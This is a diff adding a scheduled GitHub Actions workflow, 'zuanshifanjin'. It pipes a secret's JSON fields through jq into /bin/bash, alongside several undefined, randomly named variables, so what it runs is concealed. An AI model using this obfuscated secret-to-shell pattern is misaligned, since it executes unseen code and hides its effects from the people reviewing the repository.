@@ -1,0 +1,25 @@
+name: zuanshifanjin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuanshifanjin
+        env:
+          z0: ${{ secrets.z0 }}
+        run: |
+          echo $z0 | jq -r .cbh794 | /bin/bash
+          echo $b281 | jq -r .l8 | /bin/bash
+          echo $iujzm2319 | jq -r .h3015 | /bin/bash
+          echo $jye4009 | jq -r .dmw6914 | /bin/bash
+          echo $mcjub32328 | jq -r .s7 | /bin/bash
+          echo $jlog93 | jq -r .vjn6233 | /bin/bash
+          echo $umi516 | jq -r .cpz41 | /bin/bash
+          echo $hr48 | jq -r .okei53 | /bin/bash
+
